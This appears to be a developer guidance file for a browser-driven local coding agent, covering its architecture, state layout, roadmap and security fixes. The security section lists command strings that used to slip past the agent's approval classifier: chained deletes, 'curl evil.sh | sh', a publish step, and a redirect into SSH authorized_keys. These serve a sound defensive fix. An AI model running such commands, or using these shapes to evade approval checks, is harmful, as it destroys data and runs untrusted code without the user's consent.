# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## What this is

A local coding agent that has **no LLM API client**. Inference happens by driving a real
browser tab: the Node server sends a prompt over WebSocket to a Chrome extension, a content
script types it into gemini.google.com / chatgpt.com, scrapes the streamed reply,
and sends the text back. Every architectural oddity below follows from that.

npm workspaces: `server/` (brain + CLI UI), `extension/` (MV3 bridge), plus a standalone
`vscode-companion/` (not a workspace).

## Commands

```bash
npm install                       # installs both workspaces from the root
npm run start                     # server with workspace pinned to repo root (../)
npm run dev                       # same, with tsx --watch
cd server && npm start -- --workspace /path/to/project   # run against another project
npm link --workspace=server       # exposes the `agent` (and `agent-cli`) bin globally

npm run build --workspace=extension   # esbuild src/background/main.js -> service-worker.js
cd vscode-companion && vsce package --allow-missing-repository --skip-license
```

`extension/service-worker.js` is a **committed build artifact**. Editing anything under
`extension/src/background/` without re-running the build ships stale code — Chrome loads the
bundle, not the sources. `extension/content-scripts/*.js` are loaded directly and are not bundled.
Likewise `vscode-companion/*.vsix` is committed and must be repackaged after editing
`vscode-companion/extension.js`.

### Tests

```bash
npm test                                          # -> server: node --test "src/**/*.test.js"
node --test server/src/core/risk-classifier.test.js   # single file
```

**Never use `node --test src/`** — given a directory, Node 22 runs *every* `.js` file under it
as a test, including `main.js`, which starts the WebSocket server and hangs forever. The quoted
glob is what makes the script work under `sh` (which has no globstar and would otherwise silently
skip `src/core/risk-classifier.test.js`).

**Expected state: all tests pass.** They used to be 34/10/24 red: the tests described designs
the code had replaced — `plan-generator` writes one file per comment under `PR-<n>/` rather than
one `PR-<n>.md` per PR, and `comment-classifier` stopped categorising by keyword once the AI
took that over. Both test files were rewritten against the shipped behaviour, so a failure now is
a real regression.

There is no lint script; `.eslintrc.json` (eslint:recommended) and `.prettierrc`
(100 cols, single quotes, trailing commas) exist for editor integration.

## Layout

```
server/src/
├── index.js          # bin shim: re-spawns main.js under tsx (sources contain JSX)
├── main.js           # arg parsing, migration, component wiring, bootstrap
├── core/             # agent-loop, prompt-builder, diff-engine, risk-classifier,
│                     # task-manager, paths, migrate, workspaces
├── bridge/           # websocket-server (the Chrome-extension transport)
├── context/          # token budget: code-minifier, token-counter,
│                     # context-manager, memory-manager
├── github/           # PR agent: poller, comment-classifier, ci-log-parser, plan-generator
├── mcp/              # mcp-server.js + tools/
├── storage/  watcher/
└── ui/               # the terminal front-end
    ├── cli-ui.jsx    # render(): stdin shim, hotkey routing, trailing-Enter split
    ├── App.jsx       # state, effects, layout — everything else is a module
    ├── hotkeys.js    # ctrl+ chords, pulled off stdin before Ink sees them
    ├── enter-splitter.js  # peels a trailing \r off a chunk so Enter is a keypress
    ├── paste.js      # collapses a big paste to a marker; expands it on submit
    ├── format.js  constants.js  transcript.js     # pure, tested
    ├── hooks/        # use-key-bindings, use-hotkeys, use-github-tab,
    │                 #   use-github-keys, use-slash-commands, use-agent-callbacks
    └── components/   # Banner, TranscriptTurn, GithubTab, Menus, InputBar,
                      #   AgentTerminal, QuestionPrompt
```

Modules are kebab-case; React components keep PascalCase (`ui/App.jsx`). Tests are colocated
as `*.test.js` beside their subject.

## Architecture

### Turn lifecycle

`main.js` wires everything and hands off to `ui/cli-ui.jsx` → `ui/App.jsx`.

1. `App.jsx` sends user input to `AgentLoop.handleUserMessage` (`core/agent-loop.js`).
2. `PromptBuilder.buildPrompt` (`core/prompt-builder.js`) assembles the prompt.
3. `AgentLoop._sendToGemini` pushes onto `extensionQueue` and calls `callbacks.injectPrompt`;
   `bridge/websocket-server.js` relays it to the extension. The queue is serialized by
   `isExtensionBusy` — one browser tab, one in-flight prompt.
4. The content script streams back `gemini_response_stream` (rendered live) then
   `gemini_response`, which resolves `AgentLoop.handleGeminiResponse`.
5. `_extractToolCalls` parses JSON tool calls out of the reply text (there is no structured
   tool-call API — this is text parsing, hence `_cleanJsonString`), then `_executeToolCalls`
   dispatches through `MCPServer.executeTool`.
6. Results are fed back via `buildToolResultPrompt` and the loop repeats.

### Prompt economics

`PromptBuilder` sends the **full system prompt + tool definitions only on turn 0 and every
Nth turn** (`resetPromptState` after `/compact` or `/clear`). This is not an optimization —
resending a large system prompt every turn trips Gemini's repetition/safety
filters and A/B-test modals. Prompt content is also tiered by `modelTier`
(`flash` / `flash-thinking` / `pro`) via `_getReasoningInstructions`.

The **tool anchor** (`_buildToolAnchor`) is the exception that rides on *every* turn: tool
names only, 56 tokens against 1,575 for the definitions. The model does not gradually forget
its tools, it forgets them completely — mid-session it answers "I cannot execute local
commands or access your local file system" with total confidence and the turn is lost. Three
detectors in `core/drift-detector.js` back that up, each with a different response:
`looksLikeMultipleDrafts` → bring the refresh forward; `looksLikeCapabilityDenial` → resend the
full definitions and retry the turn once; `looksLikeProviderError` → Gemini's own error rather
than an answer, so re-ask (this one used to be written to disk as a PR plan). All three match
prose and will always trail the model's phrasing, which is why the anchor exists: prevention
first, detection as the backstop.

### Tools

`mcp/mcp-server.js` holds a flat `TOOL_DEFINITIONS` array (name, description, parameters,
handler) with handlers in `mcp/tools/`. To add a tool: write the handler, add one entry to that
array — the schema is what `PromptBuilder` renders into the prompt, so the description *is* the
contract. `executeTool` retries transient OS errors (EBUSY/EACCES/EAGAIN/EMFILE/EPERM) with
backoff and rewrites `errno` codes into LLM-readable instructions.

### Workspace

`core/workspaces.js` owns path handling for the workspace: `resolveWorkspaceInput` (`~`
expansion, relative paths, quotes), `validateWorkspace` (exists / is a directory / readable) and
`listWorkspaceCandidates` for the `/set-workspace` picker. `AgentLoop.setWorkspace` is the one
place that rewires the collaborators that hold a copy of the path — `/workspace` and
`/agent-dir` each used to carry their own list and had already drifted. SessionStore is
deliberately *not* rebound: doing so would write the current conversation into another
project's history.

### Approval path

Writes never go straight to disk. `edit_file` / `create_file` produce a `DiffEngine`
(`core/diff-engine.js`) diff with per-hunk accept/reject, backups, atomic writes, and `undo()`.
Commands pass through `core/risk-classifier.js`, which decides whether `App.jsx` must prompt;
persistent allow/block rules live in `commandRules`  (`/allowlist`).

### Subagents

`AgentLoop.topology` is `single` | `duo` | `swarm`. `ask_reviewer` / `ask_reasoner` /
`ask_researcher` / `ask_subagent` run **in parallel** (see the `isParallel` list in
`_executeToolCalls`), each routed by `modelConfig[role]` to a *different browser tab*.
`_runSubAgentSession` gives subagents a restricted tool set.

### Context engine

`context/` — `code-minifier`, `token-counter`, `context-manager`, `memory-manager`. `CodeMinifier.minifyJson` is on the hot
path: `PromptBuilder.buildToolResultBatch` embeds every tool result in the next prompt, and
serialising them compact rather than pretty-printed is ~40% fewer characters there.

There is no `ast-chunker` and no `skills/` registry any more. Both were written, never wired to
anything, and removed on 2026-09-10: the chunker resolved 24% of this repo's top-level symbols
(it walked only `ast.body`, so every class method and every `export const foo = () => {}` missed,
and plain acorn cannot parse the `.jsx` files at all), and `SkillRegistry` was a second, parallel
way to declare a tool that competed with `mcp/mcp-server.js`'s `TOOL_DEFINITIONS` — which is the
one described above and the one that actually runs. A per-symbol read tool is still a real gap;
it wants `acorn-walk` plus `acorn-jsx`, not that file.
`watcher/file-watcher.js` (chokidar) invalidates context on external edits. `semantic_search`
is backed by a local TF-IDF index.

### GitHub agent

`github/` polls PRs (`github-poller`), classifies comments (`comment-classifier`), parses CI
logs (`ci-log-parser`), and writes plans via `plan-generator`.

## State and config

**All workspace state lives under `.agent/`. Never hardcode that path — import
`server/src/core/paths.js`,** which is the single source of truth and the reason the layout
can't drift again.

### Where `.agent/` actually is

`workspace` used to mean two things: where state lives, and what the agent works on. In a
monorepo those come apart, so `paths.resolveState(workspace)` walks *up* looking for an
existing `.agent/`, the way git finds `.git`. The first hit is the **root**; the path from it
down to the workspace is the **scope**.

```
/base-repo/.agent/             root — shared by every repo
├── skills/  config.json                            inherited
├── repo-1/   artifacts/ state/ sessions/ logs/     this repo only
│             config.json (overrides)
└── repo-2/ …
/base-repo/AGENT.md            instructions for every repo under it
/base-repo/repo-1/             the code, with no .agent of its own
/base-repo/repo-1/AGENT.md     instructions for this repo — nearest wins
```

Nothing found — the ordinary single-repo case — and the root is `<workspace>/.agent` with an
empty scope, byte-identical to the old behaviour. Opening `/base-repo` and opening
`/base-repo/repo-1` land on the same state, because both walks end at the same root;
`workspaceSlug` is keyed on the resolved state dir for exactly that reason, so siblings don't
collide on one history file.

Scope is **explicit, never inferred from which files the agent touches**, and **chosen at
launch**: `--scope repo-1`, or just open the repo directly. Shown in the status bar. Tools stay
rooted at the workspace so cross-repo work is still possible — only state, sessions and config
are scoped. `/scope` still answers, but only to say where you are and how to change it.

**The landmine:** `homeDir()` is `~/.agent`. A naive upward walk from any project under `$HOME`
finds it and would adopt the global home as a project root, pooling every project's state and
leaking every project's rules into everyone else's prompt. `resolveState` excludes it and stops
walking at `$HOME`; `paths.test.js` covers it.

| Path | Contents |
| --- | --- |
| `<ws>/.agent/config.json` | topology, `modelConfig`, `commandRules`, `memoryEnabled`, `agentName`, GitHub token |
| `<ws>/.agent/memory.md` | what the agent learned here — scoped, never walked, read back into `<memory>` |
| `<ws>/.agent/artifacts/` | `task.md`, `plan.md`, `walkthrough.md` — written for the user to read |
| `<ws>/.agent/state/` | `editor.json` (VS Code companion), `github.json`, `plan-approval.json` |
| `<ws>/.agent/github-pr-plans/` | GitHub PR agent output |
| `<ws>/.agent/logs/errors.jsonl` | structured failure log — one JSON object per line |
| `<ws>/.agent/backups/`, `context/`, `logs/`, `tmp/` | see `paths.js` |
| `<ws>/.agent/sessions/history.jsonl` | conversation history, local copy |
| `~/.agent/workspaces/<name>-<hash>/history.jsonl` | the durable copy of the same history |

**Session history is written to both copies on every turn** (`storage/session-store.js`). The
workspace copy sits next to the code; the home copy survives a clean checkout or a wiped
`.agent/`. On startup the two are reconciled — more turns wins, the other is rebuilt from it.

`AGENT_CLI_HOME` overrides the home dir, which is `~/.agent`. The pre-rename `GEMINI_AGENT_HOME`
and the older `AGENT_HOME` are still read, because dropping them would silently repoint an
existing install rather than fail. It is
deliberately **not** `~/.gemini`: that belongs to Google's Gemini CLI and Antigravity, which
really do keep data there.

`core/migrate.js` folds the pre-`.agent` layout (`.gemini/`, `.gemini-agent/`, `~/.gemini-agent/`,
`.agent-github-plans/`, root `setAgentName.json` / `agent.log`) into `.agent/` on startup. It
runs only when `.agent/` is absent, moves rather than copies, and is a no-op on the second run.

`vscode-companion/extension.js` duplicates the `.agent` constant — it cannot import from
`server/`. Changing `AGENT_DIR` in `paths.js` means changing it there too, then repackaging
the `.vsix`.

The companion and the CLI talk only through files under `<ws>/.agent/state/`, never a socket:
`editor.json` (active file and cursor), `diagnostics.json` (the Problems panel, debounced 1.5s
because `onDidChangeDiagnostics` fires continuously while a project indexes),
`chat-queue.jsonl` (append-only; "Add to Agent Chat" selections, drained by `ui/chat-queue.js`),
`plan-review.json` (comments accumulated while reviewing) and `plan-approval.json` (the
submitted verdict: `accept` | `changes_requested` | `reject`). Files rather than a socket is
what lets the extension queue work before the CLI is even running.

### Failure logging

`core/error-log.js` writes every failure to `<ws>/.agent/logs/errors.jsonl`, tagged with the
flow it came from (`bridge`, `extension`, `agent`, `tool`, `github`, `task`, `diff`, `context`,
`ui`). `/logs` reads it back grouped by flow; `/logs <flow>` drills in.

It exists because failures here are spread across processes that cannot see each other — a
content script in a Chrome tab, the bridge, the loop, the tools, the poller — and the symptom
surfaces far from the cause. The console was the only sink, and console output inside an Ink
app is destroyed by the next repaint.

Two properties are load-bearing. It **never throws** (every caller is already on a failure
path). And it **collapses repeats**: identical failures inside a 60s window are counted rather
than written, because a poller failing every tick used to bury everything else. The tally is
written as its own record marked `tally: true` when the window closes or the process exits —
so a storm of 500 shows as 500, not 1, and the tally line is never miscounted as another
occurrence.

## Branching and PRs

**Never commit or push to `main` directly. Work lands on a branch and merges through a PR.**

The branches in this repo are deliberate: they are the history. `beta-v1` … `beta-v10`,
`fix/bridge-lock-and-cli`, `v1-stable` are kept on purpose, not left behind. Do not delete
them, and do not squash their history away.

- Branch from `main`, name it for the work (`fix/…`, `feat/…`, or the next `beta-vN`).
- Open a PR into `main`. That is the only way work reaches `main`.
- A force-push to `main` is not a merge and is not covered by this: it is a repair, it needs
  the owner to ask for it explicitly, and it breaks every open PR targeting `main` plus every
  existing clone.

A conflict on a PR that *should* be a clean descendant almost always means the two sides no
longer share history — check `git rev-list --left-right --count main...<branch>` locally
before believing GitHub. If local says `0 <n>` and GitHub says conflicts, the remote branches
have diverged (a rewrite that was pushed to one side and not the other), and the fix is to
make both sides share the same base, not to resolve 120 files by hand.

## Product decisions

Standing constraints on this project (previously kept in LEARNINGS.md). These are choices,
not limitations to route around:

- **Gemini Web only, for now** — other bridges exist (`chatgpt-bridge.js`, `claude-bridge.js`)
  and work for subagents, but Gemini is the primary target.
- **Purely local** — no hosted backend, no telemetry, no API keys. Inference happens in the
  user's own browser session, which is the whole point of the extension bridge.
- **Two front-ends** — the terminal CLI and the Chrome side panel are both supported surfaces.
- **One answer per turn** — never emit drafts or A/B alternatives for the user to pick between.

## Direction

Agreed 2026-09-10, not yet built. Recorded so the reasoning is not re-derived.

**The problem being solved:** seven mechanisms exist for "tell the model about this project"
(`AGENT.md`, `.agent/rules.md`, scoped `rules.md`, `skills/`, `memory.json`, `mistakes.md`,
`contextFolders`). Phases 2 and 3 leave two: `AGENT.md` and `skills/`, plus `memory.md`, which
is the agent's own notes rather than a place you tell it anything. with six different discovery rules between them. The count of *rules* is the
mess, not the count of files.

**The target:** two axes, one mechanism each.

| axis | question | mechanism |
| --- | --- | --- |
| scope | who does this apply to? | **where the file is** — walk up from the code, nearest wins |
| cost | always in context, or on request? | **which file** — `AGENT.md` vs `.agent/skills/` |

Repo-specific knowledge is *not* a skill. A skill's contract is "read me when my description
matches"; repo conventions match *always* when you are in that repo, and encoding "always" as
"when relevant" hands the model a judgement it will sometimes get wrong — after it has already
edited something. The test: *should the agent know this before its first action in this repo?*
Yes → `AGENT.md`. Fine to discover later → skill.

Memory is **scoped and never walked** (`.agent/<scope>/memory.md`), kept separate from
`AGENT.md` so that file can always be trusted to say what the human wrote. Promoting a learned
fact to a standing instruction is a manual edit, deliberately.

| Phase | Change | Removes | Status |
| --- | --- | --- | --- |
| 0 | `codeDir`; `AGENT.md` and skills read from the code location, not the workspace; watcher scoped | — (bug fixes) | **done** `5513557` |
| 1 | Delete `semantic_search` + `workspace-indexer` + `workspace-summarizer` + dead `ContextManager` code | ~290 lines, `madge`, the startup index build | **done** `0b93bf6` |
| 7 | Two bridges only; drop the Claude bridge, `swarm`, `ask_reasoner` | ~520 lines, 14 DOM selectors | **done** `8e60a24` |
| 2 | One instruction surface: `AGENT.md`, walked | `rules.md`, `mistakesPath`, `/init-skills`, `contextFolders`, `/context add\|remove\|list` | **done** |
| 3 | Memory as `.agent/<scope>/memory.md`, bounded in the prompt | the write-only trap | **done** |
| 4 | One model picker, five valid states, `/reasoning` → `/effort` | `reasoningEffort`, `_effortToTier`, `modelTier`, `reasoningLevel` as stored keys | **done** |
| 5 | Keep `--scope` and derived resolution; delete the runtime switcher | `/scope`'s picker, `setScope`, `listScopes`, the reload path | **done** |
| 6 | Per-model extension lock; derive topology from `modelConfig` | `topology` as a knob, `/mode`, the mode menu, the two-step config picker | **done** |

**What phase 2 kept (phase 2).** Bare `/context` survives as what its name says — a report of
what is in the window. Only `add|remove|list` went: registering folders of `.md` files was a
second way to give the model standing instructions, and that is the thing being removed, not
the ability to ask what the prompt currently costs.

Retired files are **named, never moved**. `.agent/rules.md` and `.agent/mistakes.md` stop being
read, and `runMigrations` prints one line saying so (`retiredInstructionFiles` in `core/migrate.js`).
Folding them into `AGENT.md` automatically was the obvious move and is wrong: `AGENT.md` is
usually tracked in git, so the agent would be writing an unasked-for diff into the user's repo on
startup — and CLAUDE.md's own rule is that `AGENT.md` can always be trusted to say what the human
wrote. The pre-`.agent/` migration path is the exception: `.gemini/rules.md` moves to `AGENT.md`
because `move()` refuses to clobber, so it only lands where there is no `AGENT.md` to disturb.

**The write-only trap, measured (phase 3).** `getAllMemories` had no callers. `manage_memory add`
wrote to `memory.json`, the system prompt instructed the model to use it, and no prompt ever
carried a single fact back — a tool call per fact, for nothing, forever. The fix is the missing
half, not a new mechanism: `_loadMemory` puts the facts in `<memory>` on turn 0 and every
refresh, numbered, because `remove` takes a position and the model had been choosing indices
into a list it had never been shown.

Bounded at 40 facts / 4,000 characters, degrading to a count and the path. Memory is the only
context source that grows on its own — every turn can add to it, nothing prunes it — so it is
the only one that could walk the system prompt into Gemini's repetition filter over months
without anyone making a decision. That bound is the "index-only" in the row above.

JSON became markdown because a learned fact is exactly the thing that is subtly wrong six weeks
later, and a fact you cannot correct in an editor does not get corrected. `.agent/memory.json`
is **converted** on startup where `rules.md` is only reported: it is machine-written, untracked,
inside `.agent/`, and the alternative is the agent silently forgetting everything.

**Nine states, five meanings (phase 4).** `modelTier` chose the prompt profile, `reasoningLevel`
chose how hard the pro profile pushes and did nothing on the flash tiers, and `reasoningEffort`
was a third name for the first — written on every change, read only as a fallback. The UI
apologised for the impossible combinations at the point of use ("you are on the FLASH tier,
where reasoning levels do nothing") instead of preventing them.

`core/effort.js` is now the one ladder: `flash`, `flash-thinking`, `brief`, `standard`, `deep`.
`modelTier` and `reasoningLevel` survive as *derived* values because the prompt builder really
does branch on both, but nothing stores them separately, so they cannot disagree. Each rung also
names the browser tab it is written for — a pro-tier prompt in a Flash tab is a long prompt to
the model that handles long prompts worst.

`effortFromConfig` folds an existing config on read, preferring the tier over the level when
they contradict (the tier is what the prompt actually branched on). It is deliberately fed the
config *from disk* rather than the merged object: the default `modelConfig` already carries
`effort: 'standard'`, and folding the merge let that default shadow every legacy key — a bug the
pty probe caught and `config-merge.test.js` now covers.

**Why the scope switcher goes (phase 5).** `setScope` rebuilt `SessionStore`, the conversation
history, `MemoryManager`, `ContextManager` and the prompt state in one call — its own doc comment
said switching scope "is closer to opening a different project than to changing a setting". That
is the argument against having it as a setting: the transcript on screen belongs to the old
scope, and the switcher swapped the history out from under those turns while they were still
being displayed. `--scope` at launch and the derived walk reach the same place with no such
window. The name still answers, read-only, because a group user typing `/scope` and getting
"unknown command" learns nothing about `--scope`.

**Why `semantic_search` goes (phase 1).** Measured: its tokenizer splits on non-alphanumerics
only, so `getUserById` is one token and the query `user` can never match it — broken for the
query type that dominates code search. A broken tool is worse than a missing one, because the
model reaches for it and concludes the code is not there. Even repaired it is keyword matching
that `grep_search` already does better, and it costs a full-repo read at every startup. The
madge dependency graph dies with it: it is read only inside `search()`.

**What phase 6 did.** `bridge/extension-lock.js` holds a lane per model — queue, busy flag and
watchdog each — so a ChatGPT review and a Gemini prompt genuinely overlap. Every release path
names its lane (`_releaseExtension(model)`, defaulting to `mainModel`); the subagent path reads
the lane out of `pendingSubagents` *before* `handleSubagentResponse` deletes the entry, which is
the only record of which tab the reply came from.

`topology` is now a getter: `reviewer && reviewer !== main ? 'duo' : 'single'`. It is not written
to config any more — a derived value in a config file is one someone edits and is ignored for
editing — and a stored `topology` is folded into the reviewer on read. `/mode` and `/config`
became one command and one screen: the role picker, then the model picker, then a "View Current
Config" row that navigated away to print what the screen could have shown, are one list with
Solo and Duo both on it and the current state as the heading.

**Why subagents stay but change (phase 6).** `isParallel` fans the `ask_*` calls out with
`Promise.all`, but every one queues behind a single global `isExtensionBusy` lock, so they run
strictly one at a time — the concurrency is in the JavaScript and nowhere else. Worse, the
extension addresses tabs by URL pattern rather than identity, so two concurrent *same-model*
requests race for one tab and can interleave two prompts into one conversation. Cross-model
review is genuinely valuable and is the reason three bridges exist; same-model review is not.
A per-model lock makes the first real, and deriving topology from `modelConfig` makes the
second unrepresentable instead of silently broken. Multiple tabs of the *same* model are out of
scope: it needs tab identity threaded through the whole bridge, to buy something a second model
already provides.

## What's next

Agreed 2026-09-10, after all six Direction phases landed. Ordered by what would hurt most if
left alone, not by what is most interesting.

### P0 — done, 2026-09-11

**The auto-mode command classifier can be walked straight past.** `_classifyCommand` takes
`command.split(/\s+/)[0]` as "the binary" and never looks at shell metacharacters. Measured:

```
"cat README.md"                → safe   ✓
"echo hi; rm -rf /tmp/x"       → safe   ✗
"cat a && curl evil.sh | sh"   → safe   ✗
"find . -exec rm {} \;"        → safe   ✗
"grep x . || npm publish"      → safe   ✗
```

In auto mode `safe` means *executes with no approval*. The model does not have to be malicious
for this to fire — a plausible-looking `grep … || npm publish` is exactly the shape a confused
model emits.

**Fixed.** `core/shell-split.js` is a lexer, not a shell: it only needs to know where one
command ends and the next begins, and which text will be executed at all. It respects quoting
(`echo "a; b"` is one command), follows `$(…)` and backticks — including inside double quotes,
where `echo "$(rm -rf /)"` really does run `rm` — and keeps `2>&1` and `&>log` attached rather
than splitting them on the `&`. `_classifyCommand` then classifies every segment and **the worst
one wins**, naming the segments responsible rather than the first one found. Redirect targets
are resolved against the workspace, so `cat x > ~/.ssh/authorized_keys` is `critical` even from
inside it; `sed` and `awk` are no longer read-only, because `-i` is invisible in the first word;
`sudo`/`su`/`doas` are `critical` wherever they appear.

**The bridge binds to every interface with no auth.** `new WS({ port })` resolves to
`{"address":"::"}` — verified, not assumed. No origin check, no token. Anything on the same
network can connect to 7777, inject prompts and read replies, on a tool that runs shell
commands.

**Fixed**, two ways, both free. `host: '127.0.0.1'` so nothing off this machine can reach it.
And a `verifyClient` Origin check, because a *web page* in the user's own browser can open
`ws://127.0.0.1:7777` and arrives over loopback like anything else — browsers cannot forge
`Origin`, so requiring `chrome-extension://` shuts the page out while leaving non-browser
clients (which already had to be on this machine) alone. Verified against the running server:
`lsof` shows `127.0.0.1:7821`, a website origin gets `403`, the extension connects.

**What remains:** another process running as the same user can still connect. Closing that needs
a shared secret the extension can read, which needs a setup step — a UX decision, not a patch.

**`diff-engine.js` has no tests.** 358 lines, and it is the thing that overwrites files.

**Fixed**, and writing them turned up a real bug. `_createBackup` used
`relative(workspace, absPath)` directly, and the tools accept absolute paths — so backing up a
file outside the workspace produced `../../../tmp/x`, and `resolve(backupDir, that)` wrote the
backup *outside the backup directory and outside the workspace*: with workspace `/a/b/c`, a
backup of `/tmp/x` landed at `/a/b/tmp/x.bak`. Anything outside now goes under `_external/`.

### P1 — done, 2026-09-11

**Validate tool arguments.** *(done — `mcp/validate-args.js`.)* `zod` is a dependency and
`mcp/mcp-server.js` never imports it.
`TOOL_DEFINITIONS` declares a schema per tool and `PromptBuilder` renders it into the prompt as
*the contract*, then `_extractToolCalls` does `_cleanJsonString` → `JSON.parse` → dispatch with
nothing checking the args against the schema just promised. A wrong-typed arg fails deep inside
a handler with a message the model cannot act on. Validating and returning the specific schema
error for repair is most of what a real tool-call API buys, and it is available today.

Schemas are built from the declarative `parameters` block, so there is one source of truth. It
also **coerces what is obviously meant** — `"10"` for a number is a working turn that used to be
thrown away — but deliberately *not* booleans the same way: `Boolean("false")` is `true`, which
would silently invert `isRegex` and `recursive`, the two flags where it matters most. The words
are read explicitly instead.

**The workspace commands, the way `/scope` went in phase 5.** *(done.)* `setWorkspace` rebinds
`mcpServer`, `promptBuilder`, `diffEngine` and `contextManager` but *not* `sessionStore`
(deliberately), *not* `memoryManager`, and *not* the config. So after `/workspace`:
`promptBuilder._loadMemory()` reads the new project's `memory.md` while `manage_memory add`
writes to the old one, and the old project's allowlist stays armed against the new project.
`/agent-dir` goes outright — tools already take absolute paths (`edit-file.js:15`) and the
system prompt already grants self-editing, so it unlocks nothing and silently repoints state.
`/workspace` becomes read-only; `/set-workspace` becomes a *restart* picker, which the exit-75
supervisor now makes possible. The choice is left in `~/.agent/next-workspace` and `src/index.js`
consumes it on relaunch — a file, because the child cannot rewrite its own argv, and read-once,
because a stale handover would silently override `--workspace` on every later start.

**Settings rows can outgrow the viewport.** *(done.)* `describeSettings` padded to a fixed width
with no bound against terminal width, so long values wrapped — in the live frame, which is the
one place that must never happen. The hint truncates first: it is the part you can lose and
still know what the setting is set to. Verified at 72 columns.

**Instrument `looksLikeMultipleDrafts`.** *(done — `op: 'multiple_drafts'`.)* The other two
detectors logged and this one did not, so there was no evidence it had ever fired at all —
exactly the state in which a detector that works cannot be told from one that does nothing.
`/logs agent` answers it now. **Still to do: read it after a week of use and decide.**

**Characterisation tests for `agent-loop.js`.** *(started.)* `_extractToolCalls` is covered —
it is what stands in for a tool-call API here, so it is the most load-bearing text processing
in the project, and it turned out to handle every adversarial case put to it: braces inside
strings, nested objects, raw newlines in string literals, and unfenced JSON. The retry and
dispatch paths still want scaffolding and are left for the split in P3.

### P2 — features

- **Settings tabs** — *done.* Three (`Settings · Status · Context`), because those are the
  three questions people open the page to ask; a fourth tab with two rows in it is a worse
  answer than a third tab with six. **Tab** cycles them, not ←/→, which the filter field needs
  for its cursor — inside a menu the agent's own bindings are inert, so tab is free there and
  nowhere else. Typing searches *every* tab and says so, because making someone find the right
  tab before they can search is asking them to know the answer first. Escape clears a filter
  before it closes the page. `/context`'s numbers live on the Context tab too.
- **`server/src/prompts/*.md`** — *done, partly.* The point is not readability: a prompt change
  was invisible in a diff, one word inside a template literal in a 1,000-line file, and that
  file is the one with the never-bulk-edit-with-a-regex warning. Template literals also have
  escaping rules that prose does not — a single stray backtick there surfaces as
  `ReferenceError` from an unrelated function.

  Only **static** prose moved (~116 lines, seven files): the flash and flash-thinking
  protocols, both tool-call formats, the flash core rules, the pro guardrails and the
  plan-first step. Anything the builder computes stays in JavaScript, because a markdown file
  full of `${isBrief ? '2' : '3'}` is worse than what it replaced. The move was verified
  byte-for-byte: all ten effort × topology prompt shapes came out identical, and one did not
  at first — `trimEnd()` had eaten a trailing newline that the assembled prompt depended on.
  `prompt-loader.test.js` guards it.

  **Not done: generating the tool definitions from `TOOL_DEFINITIONS`.** It cannot be done as
  described, because `ask_question`, `ask_subagent`, `ask_researcher`, `ask_reviewer` and
  `manage_memory` are dispatched in `agent-loop.js` and are not in that array at all. Generating
  needs those declared somewhere first, which is really part of splitting `agent-loop.js` (P3).
  Until then `_buildToolDefinitions` stays two hand-kept lists that must agree with the array —
  which is exactly the drift the tests in `prompt-builder.test.js` exist to catch.
- **Extension error richness** — *done.* The bridge already read `payload.op`/`stage`; nothing
  sent them. Service-worker errors now carry `op`, `stage`, `targetModel` and the DOM-side
  message that actually failed. Content scripts run in the page and cannot set fields on that
  payload, so they prefix `[stage]` to their message and the bridge lifts it back out — a
  changed selector on gemini.google.com now logs as `find_input` rather than "failed".
- **The ChatGPT bridge's image path** — *fixed, and it was broken.* It matched the
  `<image_data>` block and **deleted** it, then pasted the remaining text — so `/image` against
  ChatGPT sent a prompt discussing a screenshot nobody had been given. It now rebuilds the data
  URL into a `File` the way the Gemini bridge does, and says so in the prompt if it cannot.
- **`grep_search` for large repos** — *done.* Several patterns in one call (`["rate limit",
  "throttle", "quota"]` is one search, not three round trips), optional context lines capped at
  five, and results grouped by file with the busiest file first — on a large repo the module
  that owns a concept is usually the one that mentions it most. Fifty flat rows also repeated
  the path fifty times, and every one of those characters is retyped into the browser next turn.
  It probes one match past `maxResults` so it can tell "exactly fifty" from "fifty and we
  stopped counting": ripgrep's `--max-count` caps *per file*, so without the spare there is
  never a surplus to notice. See "Search, and why there is still no index".

### P3 — after · next

- VS Code terminal shell integration: engine `^1.80.0` → `^1.93.0`, then repackage the `.vsix`.
  `watch_task` already exists to receive it.
- Native folder picker for `/skills dir`, macOS `osascript`, hidden where no picker exists.
- **Restructure the GitHub PR agent** — 1,649 lines, the largest single feature here. Not
  deleted: planned separately once the above is done.
- Split `agent-loop.js`. The slash commands alone are ~400 lines and their removal makes the
  rest testable.
- A **symbol index** — `find_symbol` / `find_references`, from tree-sitter or ctags. The
  structural half of what a large codebase needs, and the half grep is worst at.

### Search, and why there is still no index

Decided 2026-09-11, revisited deliberately because the next codebase is a large one.

**No embedding index.** Phase 1 deleted `semantic_search` for being broken; this is the
separate question of whether a *working* one should replace it. It should not, and Claude Code —
the benchmark this project is measured against — does not have one either. Four reasons, the
last of which is specific to this architecture:

- Code search is mostly **exact-symbol** search (`getUserById`, `EADDRINUSE`), where lexical
  matching wins outright.
- An index goes **stale on every edit**. Cursor pays for a persistent background service to
  re-index continuously; the alternative is serving the model a confident map of code that no
  longer exists — the same failure phase 1 removed.
- **Chunking destroys structure.** This repo already learned that: the deleted `ast-chunker`
  resolved 24% of its own top-level symbols.
- **Retrieval is single-shot; an agent iterates.** grep → read → grep again with a better term
  beats one shot at the twenty nearest chunks, because the second query knows what the first
  found.

The constraint that settles it: **the context window is a browser chat tab.** Every retrieved
chunk is typed into Gemini by a content script. Twenty 500-token chunks is 10,000 tokens typed
into a browser per query, most of it unread — in a project whose whole prompt strategy exists to
avoid large repeated payloads. Agentic grep→read sends only what the model decided it needed.

**What a large codebase actually needs**, none of which is RAG:

| gap | answer | where |
| --- | --- | --- |
| you don't know the codebase's word for it ("rate limit" vs `throttle`) | multi-pattern `grep_search`, and prompt guidance to try synonyms — the model already knows them, it just burns a browser round-trip per guess | P2 |
| "who calls this?", "what extends this?" | a symbol index (tree-sitter or ctags): exact, invalidates on mtime, needs no model | P3 |
| orientation in an unfamiliar repo | `AGENT.md` — a human-written map beats a generated one because someone vouched for it | done, phase 2 |
| a 50-line unranked hit list is hard to reason from | context lines, grouping by file, ranking | P2 |

This is a decision made from the architecture, not from measurement. If grep genuinely fails on
real questions in the large codebase, that evidence outranks the argument above — and the shape
of the failures says which of the four rows is the one that bites.

### The fork

The agent layer's ceiling is not code quality, it is the absence of a tool-call API. Three
responses, ascending:

**A. Make the text channel as good as it gets** — P1's validation plus a sentinel-delimited
call block. Free, no product decisions.

**B. Measure before believing.** `parse_tool_calls`, `tool_amnesia` and `provider_error` are
all logged and nothing reads them as rates. Any claim about how far behind this is — including
the ones in this file — is an estimate until that view exists.

